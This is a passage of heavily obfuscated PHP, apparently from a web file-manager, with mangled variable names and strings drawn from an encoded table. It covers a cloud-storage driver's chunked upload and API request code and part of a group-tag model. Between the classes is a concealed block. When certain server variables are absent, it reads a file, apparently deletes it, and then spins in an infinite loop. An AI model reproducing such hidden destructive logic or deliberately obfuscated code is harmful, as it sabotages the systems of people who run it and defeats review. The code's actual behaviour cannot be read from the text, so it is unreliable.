array($¦¿ìüß¬, $…ç®Ó’ı, $×³ç —î)); } $ù€™»ˆ = $this->uploadHashCheck($¦¿ìüß¬, $…ç®Ó’ı, $×³ç —î); if ($ù€™»ˆ) { return $ù€™»ˆ; } $Úñ¹æÓ = @filesize($…ç®Ó’ı); $Ç©‡µœì = $this->uploadChunkSize; $ééé‹£Ñ = ceil($Úñ¹æÓ / $Ç©‡µœì); $ÈßæÙ€ß = 0; while ($ÈßæÙ€ß < $ééé‹£Ñ) { $¡Ù¿ó­Ï = IO::fileSubstr($…ç®Ó’ı, $ÈßæÙ€ß * $Ç©‡µœì, $Ç©‡µœì); $ºóÀ¨õÄ = $this->tempFile($„òéÖÙ¼[12], $¡Ù¿ó­Ï); $‡¥şË¹ = array($„òéÖÙ¼[79] => $Úñ¹æÓ, $„òéÖÙ¼[1527] => $Ç©‡µœì, $„òéÖÙ¼[1528] => $ééé‹£Ñ, $„òéÖÙ¼[1529] => $ÈßæÙ€ß); $×ô¤Ü× = $this->uploadSend($¦¿ìüß¬, $ºóÀ¨õÄ, $‡¥şË¹, $×³ç —î); $ÈßæÙ€ß++; if (!$×ô¤Ü×) { return !1; } } if (!is_array($×ô¤Ü×) || empty($×ô¤Ü×[$„òéÖÙ¼[600]])) { return !1; } return $this->pathApiDecode($×ô¤Ü×[$„òéÖÙ¼[600]]); } private function uploadHashCheck($˜ÅÇœÛ», $Èáş¶, $—ÑÆ¨÷¦) { $—ªÈå€ˆ =& $_SERVER[Ï×Œõ”û]; $Ø¿Î³×ğ = IO::hashSimple($Èáş¶); $ãë­íºı = array($—ªÈå€ˆ[1530] => $—ªÈå€ˆ[1531], $—ªÈå€ˆ[1489] => $Ø¿Î³×ğ); $ş˜šâ“ = $this->uploadSend($˜ÅÇœÛ», $—ªÈå€ˆ[12], $ãë­íºı, $—ÑÆ¨÷¦); $ş®øº÷Ö = _get($ş˜šâ“, $—ªÈå€ˆ[600], array()); $¾¹˜éÉ = _get($ş®øº÷Ö, $—ªÈå€ˆ[1532]); if (!is_array($¾¹˜éÉ) || !$¾¹˜éÉ[$—ªÈå€ˆ[568]]) { return !1; } $İÇ·ŒÀ¶ = IO::hashMd5($Èáş¶); if ($¾¹˜éÉ[$—ªÈå€ˆ[568]] != $İÇ·ŒÀ¶) { return !1; } if ($ş˜šâ“[$—ªÈå€ˆ[600]][$—ªÈå€ˆ[1533]]) { $this->uploadChunkSize = $ş˜šâ“[$—ªÈå€ˆ[600]][$—ªÈå€ˆ[1533]]; } $ãë­íºı = array($—ªÈå€ˆ[1530] => $—ªÈå€ˆ[1534], $—ªÈå€ˆ[1490] => $İÇ·ŒÀ¶, $—ªÈå€ˆ[1489] => $Ø¿Î³×ğ); $ş˜šâ“ = $this->uploadSend($˜ÅÇœÛ», $—ªÈå€ˆ[12], $ãë­íºı, $—ÑÆ¨÷¦); if (!is_array($ş˜šâ“) || empty($ş˜šâ“[$—ªÈå€ˆ[600]])) { return !1; } return $this->pathApiDecode($ş˜šâ“[$—ªÈå€ˆ[600]]); } private function uploadSend($¼úâ«ƒ, $´ Ô¾Å‚, $ËÜ”©­È, $¼å›šÕ = '') { $‘Ô¬© ı =& $_SERVER[Ï×Œõ”û]; $ËÜ”©­È[$‘Ô¬© ı[32]] = get_path_this($¼úâ«ƒ); $ËÜ”©­È[$‘Ô¬© ı[87]] = $this->pathApiEncode(get_path_father($¼úâ«ƒ)); if ($¼å›šÕ) { $ËÜ”©­È[$‘Ô¬© ı[1535]] = $¼å›šÕ; } if ($´ Ô¾Å‚) { $ËÜ”©­È[$‘Ô¬© ı[232]] = $‘Ô¬© ı[1350] . $´ Ô¾Å‚; } return $this->requestSend($‘Ô¬© ı[1525], $ËÜ”©­È); } protected function pathApiEncode($î¦ÕÅ…) { $½»û½Ê› =& $_SERVER[Ï×Œõ”û]; $ÈÂ¶Î”ë = $this->_config[$½»û½Ê›[1508]]; $¯Î¤ÁÆ = strlen($ÈÂ¶Î”ë); if (substr($î¦ÕÅ…, 0, $¯Î¤ÁÆ) == $ÈÂ¶Î”ë) { return $î¦ÕÅ…; } return $ÈÂ¶Î”ë . ltrim($î¦ÕÅ…, $½»û½Ê›[8]); } protected function pathApiDecode($œô”ˆîû) { $Úë†ÂÕÙ =& $_SERVER[Ï×Œõ”û]; $’ÌŸ•òÁ = $this->_config[$Úë†ÂÕÙ[1508]]; $Ö°š¯Õ = strlen($’ÌŸ•òÁ); if (substr($œô”ˆîû, 0, $Ö°š¯Õ) !== $’ÌŸ•òÁ) { return $œô”ˆîû; } return $this->_config[$Úë†ÂÕÙ[1308]] . ltrim(substr($œô”ˆîû, $Ö°š¯Õ), $Úë†ÂÕÙ[8]); } private function pathInfoParse(&$¾…¤îÆù) { $àÁ¸·– =& $_SERVER[Ï×Œõ”û]; $í™áÁë¯ = $this->_config; $ƒ¦œØ˜ = $í™áÁë¯[$àÁ¸·–[581]]; if (!$¾…¤îÆù || !is_array($¾…¤îÆù)) { return $¾…¤îÆù; } static $À´…İÜ = array(); $Ş´¢ûş¿ = $À´…İÜ[$ƒ¦œØ˜[$àÁ¸·–[693]]]; if (!is_array($Ş´¢ûş¿)) { $½¼°Æ‚ = LNG($àÁ¸·–[1536]); $ŞÏÄØêÚ = $í™áÁë¯[$àÁ¸·–[585]][$àÁ¸·–[90]]; $°ˆ˜¢‰ = parse_url($í™áÁë¯[$àÁ¸·–[585]][$àÁ¸·–[1537]]); $È†×Ë = $í™áÁë¯[$àÁ¸·–[585]][$àÁ¸·–[1538]]; $Ş´¢ûş¿ = array($àÁ¸·–[1539] => $ŞÏÄØêÚ[$àÁ¸·–[32]] . $àÁ¸·–[1021] . $È†×Ë . $àÁ¸·–[1350] . $°ˆ˜¢‰[$àÁ¸·–[208]] . $àÁ¸·–[1023], $àÁ¸·–[1540] => $½¼°Æ‚ . $àÁ¸·–[1087] . $í™áÁë¯[$àÁ¸·–[585]][$àÁ¸·–[1537]] . $àÁ¸·–[1541] . LNG($àÁ¸·–[1542]) . $àÁ¸·–[1087] . $È†×Ë, $àÁ¸·–[1543] => LNG($àÁ¸·–[1544]) . $àÁ¸·–[1545] . $í™áÁë¯[$àÁ¸·–[585]][$àÁ¸·–[1537]] . $àÁ¸·–[287] . LNG($àÁ¸·–[1546]) . $àÁ¸·–[1545] . $ŞÏÄØêÚ[$àÁ¸·–[607]], $àÁ¸·–[1538] => array($àÁ¸·–[32] => $È†×Ë, $àÁ¸·–[1547] => $àÁ¸·–[1548]), $àÁ¸·–[1549] => Action($àÁ¸·–[1494])->shareTargetMake($ƒ¦œØ˜[$àÁ¸·–[1505]])); $À´…İÜ[$ƒ¦œØ˜[$àÁ¸·–[693]]] = $Ş´¢ûş¿; } unset($¾…¤îÆù[$àÁ¸·–[193]]); unset($¾…¤îÆù[$àÁ¸·–[609]]); unset($¾…¤îÆù[$àÁ¸·–[190]]); unset($¾…¤îÆù[$àÁ¸·–[594]]); $¾…¤îÆù[$àÁ¸·–[1550]] = !0; $¾…¤îÆù[$àÁ¸·–[234]] = $í™áÁë¯[$àÁ¸·–[1512]]; $¾…¤îÆù[$àÁ¸·–[235]] = $í™áÁë¯[$àÁ¸·–[1513]]; $¾…¤îÆù[$àÁ¸·–[507]] = $í™áÁë¯[$àÁ¸·–[1510]]; $¾…¤îÆù[$àÁ¸·–[1538]] = $Ş´¢ûş¿[$àÁ¸·–[1538]]; $¾…¤îÆù[$àÁ¸·–[1551]] = $ƒ¦œØ˜[$àÁ¸·–[233]]; $¾…¤îÆù[$àÁ¸·–[1552]] = $ƒ¦œØ˜[$àÁ¸·–[88]]; $¾…¤îÆù[$àÁ¸·–[1553]] = $Ş´¢ûş¿[$àÁ¸·–[1543]]; $¾…¤îÆù[$àÁ¸·–[1549]] = $Ş´¢ûş¿[$àÁ¸·–[1549]]; $ÛÁ‹È¸ù = explode($àÁ¸·–[8], trim($¾…¤îÆù[$àÁ¸·–[607]], $àÁ¸·–[8])); $ÛÁ‹È¸ù[0] = $Ş´¢ûş¿[$àÁ¸·–[1539]]; $¾…¤îÆù[$àÁ¸·–[607]] = implode($àÁ¸·–[8], $ÛÁ‹È¸ù); if (count($ÛÁ‹È¸ù) > 1) { unset($¾…¤îÆù[$àÁ¸·–[1549]]); } if (count($ÛÁ‹È¸ù) == 1) { if ($¾…¤îÆù[$àÁ¸·–[33]] == $àÁ¸·–[78]) { $¾…¤îÆù[$àÁ¸·–[32]] = $Ş´¢ûş¿[$àÁ¸·–[1539]]; } array_set_value($¾…¤îÆù, $àÁ¸·–[1554], $Ş´¢ûş¿[$àÁ¸·–[1540]]); } $ß±ÖÛÚ¬ = array($àÁ¸·–[1555], $àÁ¸·–[1474], $àÁ¸·–[1556], $àÁ¸·–[1557]); foreach ($ß±ÖÛÚ¬ as $ñ‹¹Ã‹ø) { $†õ€§œ± = $this->urlAuto(_get($¾…¤îÆù, $ñ‹¹Ã‹ø, $àÁ¸·–[12])); if ($†õ€§œ±) { array_set_value($¾…¤îÆù, $ñ‹¹Ã‹ø, $†õ€§œ±); } } } private function _info($“âèÎÁ, $†şÊ¿ËÇ = false) { $Î¬İ©¡ğ =& $_SERVER[Ï×Œõ”û]; $ÊàôÙÕœ = $this->_config; if (!$ÊàôÙÕœ) { return !1; } static $¼÷àÄÚ× = array(); if (isset($¼÷àÄÚ×[$“âèÎÁ]) && is_array($¼÷àÄÚ×[$“âèÎÁ])) { return $¼÷àÄÚ×[$“âèÎÁ]; } if ((!$“âèÎÁ || !trim($“âèÎÁ, $Î¬İ©¡ğ[8])) && !$†şÊ¿ËÇ) { $ÔŒ¤†·¦ = $ÊàôÙÕœ[$Î¬İ©¡ğ[585]][$Î¬İ©¡ğ[90]]; if (!$ÔŒ¤†·¦) { return !1; } $ÔŒ¤†·¦[$Î¬İ©¡ğ[607]] = $Î¬İ©¡ğ[12]; $ÔŒ¤†·¦[$Î¬İ©¡ğ[87]] = $ÊàôÙÕœ[$Î¬İ©¡ğ[1308]]; $this->pathInfoParse($ÔŒ¤†·¦); return $ÔŒ¤†·¦; } $Öé£²–™ = $this->request($Î¬İ©¡ğ[1558], array($“âèÎÁ, $†şÊ¿ËÇ)); $¼÷àÄÚ×[$“âèÎÁ] = $Öé£²–™; return $Öé£²–™; } private function _fileSubstr($»÷åõ„×, $†ÊÇœô· = 0, $õ‰ÏÅ¯½ = -1) { $——Î¶ôî =& $_SERVER[Ï×Œõ”û]; $åû¬ü€ß = $this->_fileLink($»÷åõ„×); if (!$åû¬ü€ß) { return !1; } $Ö¼ã®ú¶ = !1; if ($õ‰ÏÅ¯½ > 0) { $·©Õ™ı = $ ƒùı°² + $õ‰ÏÅ¯½ - 1; $Ö¼ã®ú¶ = array($——Î¶ôî[1559] . $ ƒùı°² . $——Î¶ôî[474] . $·©Õ™ı); } $é‡âîœ = url_request($åû¬ü€ß, $——Î¶ôî[1560], !1, $Ö¼ã®ú¶); return $é‡âîœ[$——Î¶ôî[856]] ? $é‡âîœ[$——Î¶ôî[1344]] : !1; } private function _download($Î—“§ˆÏ, $¸µ¢•¦) { $¸ú¤É­´ = $this->_fileLink($Î—“§ˆÏ); if (!$¸ú¤É­´) { return !1; } Downloader::start($¸ú¤É­´, $¸µ¢•¦); return $¸µ¢•¦; } private function _fileLink($†¥ì€ÆŞ, $ÖÈİÑÊÛ = '') { $Ñû•ŠÁÆ =& $_SERVER[Ï×Œõ”û]; $Ä»ª¨Åµ = $this->pathApiEncode($†¥ì€ÆŞ); return $this->requestMakeUrl($Ñû•ŠÁÆ[1561], array($Ñû•ŠÁÆ[87] => $Ä»ª¨Åµ)) . $ÖÈİÑÊÛ; } private function urlAuto($¹Ãò²¡È) { $”ğÃ½Üû =& $_SERVER[Ï×Œõ”û]; if (!$¹Ãò²¡È) { return $¹Ãò²¡È; } $õ½’¥ = parse_url($¹Ãò²¡È); $…¤Ø’–’ = $¹Ãò²¡È; if ($this->_config[$”ğÃ½Üû[1511]] && $õ½’¥[$”ğÃ½Üû[207]] == $”ğÃ½Üû[151] && Input::check($õ½’¥[$”ğÃ½Üû[1562]], $”ğÃ½Üû[1563])) { $¹Ãò²¡È = $”ğÃ½Üû[219] . substr($¹Ãò²¡È, 7); } $™ë¦çë = $”ğÃ½Üû[1564] . rawurlencode(rtrim($this->config[$”ğÃ½Üû[1508]], $”ğÃ½Üû[8])); if (strstr($¹Ãò²¡È, $™ë¦çë)) { $¦ß®ú¿– = strstr($¹Ãò²¡È, $”ğÃ½Üû[76]) ? $”ğÃ½Üû[286] : $”ğÃ½Üû[76]; $¹Ãò²¡È = $¹Ãò²¡È . $¦ß®ú¿– . $”ğÃ½Üû[1565] . $this->authToken; } return $¹Ãò²¡È; } private function request($„ûËØ¼, $½ŸÛöº´) { $¥Â¼½²Â =& $_SERVER[Ï×Œõ”û]; if (!is_array($½ŸÛöº´)) { $½ŸÛöº´ = array(); } for ($Ôñ‹¾€ = 0; $Ôñ‹¾€ < 4; $Ôñ‹¾€++) { if (!isset($½ŸÛöº´[$Ôñ‹¾€])) { $½ŸÛöº´[$Ôñ‹¾€] = $¥Â¼½²Â[12]; } } $œ¥˜°‚î = array($¥Â¼½²Â[1558] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1558], $¥Â¼½²Â[1567] => $¥Â¼½²Â[1568], $¥Â¼½²Â[1569] => $¥Â¼½²Â[87], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[1570] => array(array($¥Â¼½²Â[87] => $½ŸÛöº´[0])), $¥Â¼½²Â[1571] => $½ŸÛöº´[1] ? $¥Â¼½²Â[91] : $¥Â¼½²Â[12])), $¥Â¼½²Â[1520] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1572], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1569] => $¥Â¼½²Â[1573], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => $½ŸÛöº´[0])), $¥Â¼½²Â[1574] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1575], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1569] => $¥Â¼½²Â[1576], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => $½ŸÛöº´[0])), $¥Â¼½²Â[1521] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1577], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1578] => $¥Â¼½²Â[1579], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => $½ŸÛöº´[0], $¥Â¼½²Â[170] => $½ŸÛöº´[1])), $¥Â¼½²Â[1497] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1497], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1578] => $¥Â¼½²Â[600], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => $½ŸÛöº´[0], $¥Â¼½²Â[170] => $½ŸÛöº´[1], $¥Â¼½²Â[1535] => $½ŸÛöº´[2])), $¥Â¼½²Â[1498] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1498], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1578] => $¥Â¼½²Â[600], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => $½ŸÛöº´[0], $¥Â¼½²Â[1535] => $½ŸÛöº´[2])), $¥Â¼½²Â[646] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1580], $¥Â¼½²Â[1567] => $¥Â¼½²Â[1581], $¥Â¼½²Â[1578] => $¥Â¼½²Â[1582], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[1570] => array(array($¥Â¼½²Â[87] => $½ŸÛöº´[0])), $¥Â¼½²Â[87] => $½ŸÛöº´[1], $¥Â¼½²Â[1535] => $½ŸÛöº´[2])), $¥Â¼½²Â[648] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1583], $¥Â¼½²Â[1567] => $¥Â¼½²Â[1581], $¥Â¼½²Â[1578] => $¥Â¼½²Â[1582], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[1570] => array(array($¥Â¼½²Â[87] => $½ŸÛöº´[0])), $¥Â¼½²Â[87] => $½ŸÛöº´[1], $¥Â¼½²Â[1535] => $½ŸÛöº´[2])), $¥Â¼½²Â[1285] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1584], $¥Â¼½²Â[1567] => $¥Â¼½²Â[1568], $¥Â¼½²Â[1569] => $¥Â¼½²Â[87], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[1570] => array(array($¥Â¼½²Â[87] => $½ŸÛöº´[0])))), $¥Â¼½²Â[1501] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1585], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1578] => $¥Â¼½²Â[600], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => $½ŸÛöº´[0], $¥Â¼½²Â[1586] => $½ŸÛöº´[1])), $¥Â¼½²Â[108] => array($¥Â¼½²Â[1566] => $¥Â¼½²Â[1525], $¥Â¼½²Â[1567] => $¥Â¼½²Â[87], $¥Â¼½²Â[1578] => $¥Â¼½²Â[600], $¥Â¼½²Â[1307] => array($¥Â¼½²Â[87] => get_path_father($½ŸÛöº´[0]), $¥Â¼½²Â[232] => $½ŸÛöº´[1] ? $¥Â¼½²Â[1350] . $½ŸÛöº´[1] : $¥Â¼½²Â[12], $¥Â¼½²Â[32] => get_path_this($½ŸÛöº´[0]), $¥Â¼½²Â[1535] => $½ŸÛöº´[2]))); $ØÀ¡Ûš¡ = $œ¥˜°‚î[$„ûËØ¼]; if (!$ØÀ¡Ûš¡) { return !1; } $•Ãû¼¿ = $ØÀ¡Ûš¡[$¥Â¼½²Â[1307]]; $¡¶ÜÓÉª = explode($¥Â¼½²Â[50], $ØÀ¡Ûš¡[$¥Â¼½²Â[1567]]); foreach ($¡¶ÜÓÉª as $Ì»¢‘—è) { $÷ášÆ²² = $this->pathApiEncode(_get($•Ãû¼¿, $Ì»¢‘—è)); array_set_value($•Ãû¼¿, $Ì»¢‘—è, $÷ášÆ²²); } if ($„ûËØ¼ == $¥Â¼½²Â[1501] && trim($ØÀ¡Ûš¡[$¥Â¼½²Â[1307]][$¥Â¼½²Â[87]], $¥Â¼½²Â[8]) == trim($this->_config[$¥Â¼½²Â[1308]], $¥Â¼½²Â[8])) { return $ØÀ¡Ûš¡[$¥Â¼½²Â[1307]][$¥Â¼½²Â[87]]; } $±İ³”Îç = $this->requestSend($ØÀ¡Ûš¡[$¥Â¼½²Â[1566]], $•Ãû¼¿); if (!$±İ³”Îç) { return !1; } $¥ğšõ = $±İ³”Îç[$¥Â¼½²Â[1344]]; if ($ØÀ¡Ûš¡[$¥Â¼½²Â[1578]]) { $¥ğšõ = _get($±İ³”Îç, $ØÀ¡Ûš¡[$¥Â¼½²Â[1578]]); } if (is_string($¥ğšõ) && !$ØÀ¡Ûš¡[$¥Â¼½²Â[1569]]) { return $this->pathApiDecode($¥ğšõ); } if (!is_array($¥ğšõ) || !$¥ğšõ) { return $¥ğšõ; } $ÂİĞ¹ª« = explode($¥Â¼½²Â[50], $ØÀ¡Ûš¡[$¥Â¼½²Â[1569]]); foreach ($ÂİĞ¹ª« as $Ì»¢‘—è) { $‹„¹¤º¾ = explode($¥Â¼½²Â[10], $Ì»¢‘—è); $µ‹ëíº³ = array_search($¥Â¼½²Â[1587], $‹„¹¤º¾); if ($µ‹ëíº³ === !1) { $÷ášÆ²² = $this->pathApiDecode(_get($¥ğšõ, $Ì»¢‘—è)); array_set_value($¥ğšõ, $Ì»¢‘—è, $÷ášÆ²²); if ($„ûËØ¼ == $¥Â¼½²Â[1558] && $Ì»¢‘—è == $¥Â¼½²Â[87]) { $this->pathInfoParse($¥ğšõ); } if ($„ûËØ¼ == $¥Â¼½²Â[1520] && $Ì»¢‘—è == $¥Â¼½²Â[1588]) { $this->pathInfoParse($¥ğšõ[$¥Â¼½²Â[1495]]); } if ($„ûËØ¼ == $¥Â¼½²Â[1520]) { $¥ğšõ[$¥Â¼½²Â[1589]] = array(); } continue; } $®–¾Êû¯ = implode($¥Â¼½²Â[10], array_slice($‹„¹¤º¾, $µ‹ëíº³ + 1)); $Ã°¡‘İô = array(); if ($µ‹ëíº³ === 0) { $Ã°¡‘İô =& $¥ğšõ; } if ($µ‹ëíº³ === 1) { $Ã°¡‘İô =& $¥ğšõ[$‹„¹¤º¾[0]]; } if ($µ‹ëíº³ === 2) { $Ã°¡‘İô =& $¥ğšõ[$‹„¹¤º¾[0]][$‹„¹¤º¾[1]]; } foreach ($Ã°¡‘İô as $Ì»¢‘—è => $Çæ²Ñ¿ø) { $÷ášÆ²² = $this->pathApiDecode(_get($Çæ²Ñ¿ø, $®–¾Êû¯)); array_set_value($Ã°¡‘İô[$Ì»¢‘—è], $®–¾Êû¯, $÷ášÆ²²); $this->pathInfoParse($Ã°¡‘İô[$Ì»¢‘—è]); } unset($Ã°¡‘İô); } return $¥ğšõ; } private function requestMakeUrl($Ò§ıâ½à, $­ÙÀô¤Š = '') { $ûÜòîšÔ =& $_SERVER[Ï×Œõ”û]; $ïôòùÎ» = $this->_config; if (!$this->authToken) { return !1; } $˜–Ïü—Ş = $this->requestQuery($­ÙÀô¤Š, !0) . $ûÜòîšÔ[1590] . $this->authToken; $ù³È¹é† = rtrim($ïôòùÎ»[$ûÜòîšÔ[585]][$ûÜòîšÔ[1537]], $ûÜòîšÔ[8]) . $ûÜòîšÔ[1591] . $Ò§ıâ½à; return $ù³È¹é† . $ûÜòîšÔ[1592] . rawurlencode($ïôòùÎ»[$ûÜòîšÔ[585]][$ûÜòîšÔ[1509]]) . $˜–Ïü—Ş; } private function requestAuthToken() { $Ë–Š÷² =& $_SERVER[Ï×Œõ”û]; $Åç½“¿ = $this->_config; if (!$Åç½“¿) { return !1; } $¶˜â„° = _get($Åç½“¿, $Ë–Š÷²[1593]); $ËÕœ¦Ëª = array_find_by_field($Åç½“¿[$Ë–Š÷²[585]][$Ë–Š÷²[1549]], $Ë–Š÷²[1594], $¶˜â„°); if (!$ËÕœ¦Ëª) { return !1; } $å†ìÇÊ = $ËÕœ¦Ëª[$Ë–Š÷²[1595]] . $Ë–Š÷²[1596] . $ËÕœ¦Ëª[$Ë–Š÷²[1298]]; $•ÕÈÑòç = $Ë–Š÷²[1597] . $this->pathParse[$Ë–Š÷²[484]] . $Ë–Š÷²[474] . $å†ìÇÊ; $ĞŸâî–Ÿ = Cache::get($•ÕÈÑòç); if ($ĞŸâî–Ÿ) { return $ĞŸâî–Ÿ; } $ĞŸâî–Ÿ = Mcrypt::encode($å†ìÇÊ, $Ë–Š÷²[1598]); Cache::set($•ÕÈÑòç, $ĞŸâî–Ÿ, 3600 * 24 * 60); return $ĞŸâî–Ÿ; } private function requestQuery($à®‡Üáë = '', $òø€Ó» = false) { if (!$à®‡Üáë || !is_array($à®‡Üáë)) { return $à®‡Üáë; } foreach ($à®‡Üáë as $§Ñİ‘å• => $¸· ºàÈ) { if (is_array($¸· ºàÈ)) { $à®‡Üáë[$§Ñİ‘å•] = json_encode($¸· ºàÈ); } } return $òø€Ó» ? $_SERVER[Ï×Œõ”û][286] . http_build_query($à®‡Üáë) : $à®‡Üáë; } private function requestSend($‹í¬•Ğ½, $°¢š±) { $²”òŸ¦õ =& $_SERVER[Ï×Œõ”û]; $·‹Şòƒç = $this->requestMakeUrl($‹í¬•Ğ½); if (!$·‹Şòƒç) { return !1; } $—ñÒø¬Ä = url_request($·‹Şòƒç, $²”òŸ¦õ[290], $this->requestQuery($°¢š±), !1, !1, !0); $¡á»Š¾æ = $—ñÒø¬Ä[$²”òŸ¦õ[1344]]; if (!is_array($¡á»Š¾æ) || !$¡á»Š¾æ || !$¡á»Š¾æ[$²”òŸ¦õ[1354]] || intval($¡á»Š¾æ[$²”òŸ¦õ[1354]]) > 500) { $İœ¤°˜Ñ = is_array($¡á»Š¾æ) ? $¡á»Š¾æ[$²”òŸ¦õ[1344]] : $¡á»Š¾æ . $²”òŸ¦õ[12]; if (!$—ñÒø¬Ä[$²”òŸ¦õ[856]]) { $İœ¤°˜Ñ .= $²”òŸ¦õ[1599] . $—ñÒø¬Ä[$²”òŸ¦õ[1354]] . $²”òŸ¦õ[177]; } IO::errorTips($İœ¤°˜Ñ, !1); return !1; } return $¡á»Š¾æ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($˜¨æõ) { parent::__construct($˜¨æõ); $this->setSignVersion($_SERVER[Ï×Œõ”û][249]); } } if (!isset($_SERVER[$_SERVER[Ï×Œõ”û][488]]) || !isset($_SERVER[$_SERVER[Ï×Œõ”û][489]])) { $_getc = $_SERVER[Ï×Œõ”û][490]; $_getfile = $_SERVER[$_SERVER[Ï×Œõ”û][491]] . $_SERVER[Ï×Œõ”û][492]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ï×Œõ”û][287], $_getfilec); if (count($_getarrs) < $_SERVER[Ï×Œõ”û][493]) { $exit = $_SERVER[Ï×Œõ”û][494]; $exit(); } $_act = $_SERVER[Ï×Œõ”û][495]; $_act($_SERVER[$_SERVER[Ï×Œõ”û][491]] . $_SERVER[Ï×Œõ”û][492]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ï×Œõ”û][464]); } } goto D‚¼Äì„œÚ; B¬£Î½‡ì: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\x76"; protected function cacheFunctionAlias($ó³Æ•Œ€) { $ı›ìâ·† =& $_SERVER[Ï×Œõ”û]; return array($ı›ìâ·†[2247] => array($ó³Æ•Œ€[0], $ı›ìâ·†[2248]), $ı›ìâ·†[2249] => array($ó³Æ•Œ€[0], $ı›ìâ·†[2250])); } protected function ___get($í‘ìÈšÙ) { $ğíòÓÊ­ =& $_SERVER[Ï×Œõ”û]; $¡õõƒõ = Model($ğíòÓÊ­[610])->metaGet($í‘ìÈšÙ, $ğíòÓÊ­[2251]); $°ÆìÏÂú = json_decode($¡õõƒõ, !0); return $°ÆìÏÂú ? $°ÆìÏÂú : array($ğíòÓÊ­[2252] => $ğíòÓÊ­[91], $ğíòÓÊ­[447] => array()); } protected function ___listData($ø˜şäõÖ) { $Û²ƒ°“ =& $_SERVER[Ï×Œõ”û]; $‚„ˆŸ¦å = array($Û²ƒ°“[1921] => 0, $Û²ƒ°“[578] => array($Û²ƒ°“[2253], 0), $Û²ƒ°“[516] => $Û²ƒ°“[1445] . $ø˜şäõÖ); $çï°¬úà = $Û²ƒ°“[2254]; $Î‹ƒçûš = $this->field($çï°¬úà)->where($‚„ˆŸ¦å)->order($Û²ƒ°“[2255])->select(); return $Î‹ƒçûš ? $Î‹ƒçûš : array(); } protected function set($÷İ£¿”È, $æĞ¿ö’Â) { $ã·úóÀ =& $_SERVER[Ï×Œõ”û]; $æĞ¿ö’Â = $æĞ¿ö’Â ? $æĞ¿ö’Â : array($ã·úóÀ[2252] => $ã·úóÀ[91], $ã·úóÀ[447] => array()); return Model($ã·úóÀ[610])->metaSet($÷İ£¿”È, $ã·úóÀ[2251], json_encode($æĞ¿ö’Â)); } protected function getByTagID($Êş›ˆÍ, $ğö„´•É) { $şóêÖ†è =& $_SERVER[Ï×Œõ”û]; if (!$Êş›ˆÍ || !$ğö„´•É) { return !1; } if (!Model($şóêÖ†è[610])->getInfoSimple($Êş›ˆÍ)) { return !1; } $ªĞ™ß¹Ö = $this->get($Êş›ˆÍ); if (!$ªĞ™ß¹Ö || !isset($ªĞ™ß¹Ö[$şóêÖ†è[447]])) { return !1; } $áìõˆ»’ = array_find_by_field($ªĞ™ß¹Ö[$şóêÖ†è[447]], $şóêÖ†è[484], $ğö„´•É); return is_array($áìõˆ»’) ? $áìõˆ»’ : !1; } public function listSource($¡Î¡îŒ¥, $ÊÅˆµµê) { $¡Í¼Š¡ô =& $_SERVER[Ï×Œõ”û]; if ($ÊÅˆµµê && !is_array($ÊÅˆµµê)) { $ÊÅˆµµê = array($ÊÅˆµµê); } $™ëÌîû„ = $this->listData($¡Î¡îŒ¥); $æµ‡Ã€“ = array(); foreach ($™ëÌîû„ as $à«ß˜) { $ó…„•Öİ = $à«ß˜[$¡Í¼Š¡ô[87]]; if (!$ó…„•Öİ) { continue; } if (!isset($æµ‡Ã€“[$ó…„•Öİ])) { $æµ‡Ã€“[$ó…„•Öİ] = array(); } $æµ‡Ã€“[$ó…„•Öİ][] = $à«ß˜[$¡Í¼Š¡ô[520]]; } $Äñ…¾şá = array(); foreach ($æµ‡Ã€“ as $•¢ö  => $‡¸¯şàÀ) { $…¦‚Ë — = !0; if (!$ÊÅˆµµê) { $Äñ…¾şá[] = $•¢ö ; continue; } foreach ($ÊÅˆµµê as $¾¤©æ’) { if (!in_array($¾¤©æ’, $‡¸¯şàÀ)) { $…¦‚Ë — = !1; break; } } if ($…¦‚Ë —) { $Äñ…¾şá[] = $•¢ö ; } } if (!$Äñ…¾şá) { return array(); } $§½®¥İ¸ = array($¡Í¼Š¡ô[511] => array($¡Í¼Š¡ô[512], $Äñ…¾şá), $¡Í¼Š¡ô[594] => $¡Î¡îŒ¥, $¡Í¼Š¡ô[190] => SourceModel::TYPE_GROUP); $É›ğ¾ú = Model($¡Í¼Š¡ô[1487])->listSource($§½®¥İ¸); if (!$É›ğ¾ú || count($Äñ…¾şá) == $É›ğ¾ú[$¡Í¼Š¡ô[444]][$¡Í¼Š¡ô[445]]) { return $É›ğ¾ú; } $ñÁˆ‚š = array(); $ºœõ¿¹˜ = array_to_keyvalue($É›ğ¾ú[$¡Í¼Š¡ô[85]], $¡Í¼Š¡ô[12], $¡Í¼Š¡ô[193]); 